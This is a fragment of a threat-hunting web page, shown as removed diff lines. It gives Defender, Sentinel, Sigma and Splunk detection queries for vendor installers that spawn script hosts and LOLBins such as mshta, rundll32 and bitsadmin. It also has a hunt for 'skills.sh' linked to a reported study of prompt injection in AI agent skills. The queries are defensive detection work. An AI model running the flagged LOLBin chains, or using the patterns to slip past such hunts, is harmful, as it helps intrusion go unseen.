-      <button class="tab-btn active" data-target="art-607-uc4-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-607-uc4-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-607-uc4-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-607-uc4-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-607-uc4-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where AccountName !endswith &quot;$&quot;
-| where InitiatingProcessFileName in~ (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
-| where FileName in~ (&quot;powershell.exe&quot;,&quot;cmd.exe&quot;,&quot;rundll32.exe&quot;,&quot;regsvr32.exe&quot;,&quot;mshta.exe&quot;,&quot;wscript.exe&quot;,&quot;cscript.exe&quot;,&quot;wmic.exe&quot;,&quot;bitsadmin.exe&quot;)
-| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine</code></pre></div>
-    <div class="tab-content" id="art-607-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>// Replace `&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;` with the vendor binaries observed in the
-// article (matching shape with the Defender query).
-SecurityEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventID == 4688
-| where Account !endswith &quot;$&quot;
-| where ParentProcessName has_any (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
-| where NewProcessName endswith &quot;\powershell.exe&quot;
-   or NewProcessName endswith &quot;\cmd.exe&quot;
-   or NewProcessName endswith &quot;\rundll32.exe&quot;
-   or NewProcessName endswith &quot;\regsvr32.exe&quot;
-   or NewProcessName endswith &quot;\mshta.exe&quot;
-   or NewProcessName endswith &quot;\wscript.exe&quot;
-   or NewProcessName endswith &quot;\cscript.exe&quot;
-   or NewProcessName endswith &quot;\wmic.exe&quot;
-   or NewProcessName endswith &quot;\bitsadmin.exe&quot;
-| project TimeGenerated, Computer, Account, ParentProcessName,
-          NewProcessName, CommandLine
-| order by TimeGenerated desc
-</code></pre></div>
-    <div class="tab-content" id="art-607-uc4-sigma"><pre><button class="copy-btn">COPY</button><code>title: Trusted Vendor Binary Launching Unusual Children
-id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
-status: experimental
-description: |
-    A signed vendor binary (in the article&#x27;s named-vendors list)
-    spawning script-host or LOLBin children. Strongest signal when
-    paired with a recent CVE / supply-chain advisory naming the same
-    vendor.
-references:
-    - https://attack.mitre.org/techniques/T1195/
-author: Clankerusecase
-date: 2026/05/02
-tags:
-    - attack.t1195
-    - attack.initial-access
-logsource:
-    category: process_creation
-    product: windows
-detection:
-    selection_child:
-        Image|endswith:
-            - &#x27;\powershell.exe&#x27;
-            - &#x27;\pwsh.exe&#x27;
-            - &#x27;\cmd.exe&#x27;
-            - &#x27;\rundll32.exe&#x27;
-            - &#x27;\regsvr32.exe&#x27;
-            - &#x27;\mshta.exe&#x27;
-            - &#x27;\wscript.exe&#x27;
-            - &#x27;\cscript.exe&#x27;
-            - &#x27;\wmic.exe&#x27;
-            - &#x27;\bitsadmin.exe&#x27;
-    selection_parent_vendor:
-        ParentImage|contains:
-            - &#x27;\Program Files\&#x27;
-            - &#x27;\Program Files (x86)\&#x27;
-    condition: selection_child and selection_parent_vendor
-falsepositives:
-    - Many — installers and updaters legitimately spawn children. Pin
-      the parent path to specific vendor binaries observed in the
-      article before alerting.
-level: medium
-</code></pre></div>
-    <div class="tab-content" id="art-607-uc4-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-607-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-607-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-607-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Endpoint.Processes
-    where Processes.parent_process_name IN (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
-      AND Processes.process_name IN (&quot;powershell.exe&quot;,&quot;cmd.exe&quot;,&quot;rundll32.exe&quot;,&quot;regsvr32.exe&quot;,&quot;mshta.exe&quot;,&quot;wscript.exe&quot;,&quot;cscript.exe&quot;,&quot;wmic.exe&quot;,&quot;bitsadmin.exe&quot;)
-    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
-| `drop_dm_object_name(Processes)`</code></pre><pre class="spl-mode-body" id="art-607-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Endpoint.Processes
-    where Processes.parent_process_name IN (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
-      AND Processes.process_name IN (&quot;powershell.exe&quot;,&quot;cmd.exe&quot;,&quot;rundll32.exe&quot;,&quot;regsvr32.exe&quot;,&quot;mshta.exe&quot;,&quot;wscript.exe&quot;,&quot;cscript.exe&quot;,&quot;wmic.exe&quot;,&quot;bitsadmin.exe&quot;)
-    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
-| `drop_dm_object_name(Processes)`</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="f899838188" data-platforms="def,sent,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">Article-specific behavioural hunt — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu</span>
-    <span class="uc-phase">Exploitation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="f899838188" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="User Execution: Malicious File">T1204.002</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-607-uc5-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-607-uc5-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-607-uc5-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-607-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu
-// Hunts the actual binaries / paths / commandline fragments named
-// in the article instead of a generic technique-class template.
-DeviceProcessEvents
-| where Timestamp &gt; ago(30d)
-| where (FileName in~ (&quot;skills.sh&quot;))
-| project Timestamp, DeviceName, AccountName, FileName,
-          FolderPath, ProcessCommandLine,
-          InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by Timestamp desc
-
-// File-creation events for the named binaries / paths
-DeviceFileEvents
-| where Timestamp &gt; ago(30d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where (FileName in~ (&quot;skills.sh&quot;))
-| project Timestamp, DeviceName, AccountName, FolderPath,
-          FileName, ActionType, InitiatingProcessFileName,
-          InitiatingProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
-// Requires the Microsoft 365 Defender data connector (streams the
-// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
-// Article-specific bespoke detection — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu
-// Hunts the actual binaries / paths / commandline fragments named
-// in the article instead of a generic technique-class template.
-DeviceProcessEvents
-| where TimeGenerated &gt; ago(30d)
-| where (FileName in~ (&quot;skills.sh&quot;))
-| project TimeGenerated, DeviceName, AccountName, FileName,
-          FolderPath, ProcessCommandLine,
-          InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by TimeGenerated desc
-
-// File-creation events for the named binaries / paths
-DeviceFileEvents
-| where TimeGenerated &gt; ago(30d)
-| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
-| where (FileName in~ (&quot;skills.sh&quot;))
-| project TimeGenerated, DeviceName, AccountName, FolderPath,
-          FileName, ActionType, InitiatingProcessFileName,
-          InitiatingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc5-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-607-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-607-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-607-uc5-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu ```
-| tstats `summariesonly` count earliest(_time) AS firstTime latest(_time) AS lastTime
-    from datamodel=Endpoint.Processes
-    where (Processes.process_name IN (&quot;skills.sh&quot;))
-    by Processes.dest, Processes.user, Processes.process_name,
-       Processes.process, Processes.parent_process_name, Processes.process_path
-| `drop_dm_object_name(Processes)`
-| `security_content_ctime(firstTime)`
-| append [
-| tstats `summariesonly` count
-    from datamodel=Endpoint.Filesystem
-    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
-      AND (Filesystem.file_name IN (&quot;skills.sh&quot;))
-    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
-       Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`
-]</code></pre><pre class="spl-mode-body" id="art-607-uc5-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu ```
-| tstats summariesonly=false count earliest(_time) AS firstTime latest(_time) AS lastTime
-    from datamodel=Endpoint.Processes
-    where (Processes.process_name IN (&quot;skills.sh&quot;))
-    by Processes.dest, Processes.user, Processes.process_name,
-       Processes.process, Processes.parent_process_name, Processes.process_path
-| `drop_dm_object_name(Processes)`
-| `security_content_ctime(firstTime)`
-| append [
-| tstats summariesonly=false count
-    from datamodel=Endpoint.Filesystem
-    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
-      AND (Filesystem.file_name IN (&quot;skills.sh&quot;))
-    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
-       Filesystem.file_path, Filesystem.file_name
-| `drop_dm_object_name(Filesystem)`
-]</code></pre></div></div>
   </div>
 </details></div>
 </article>
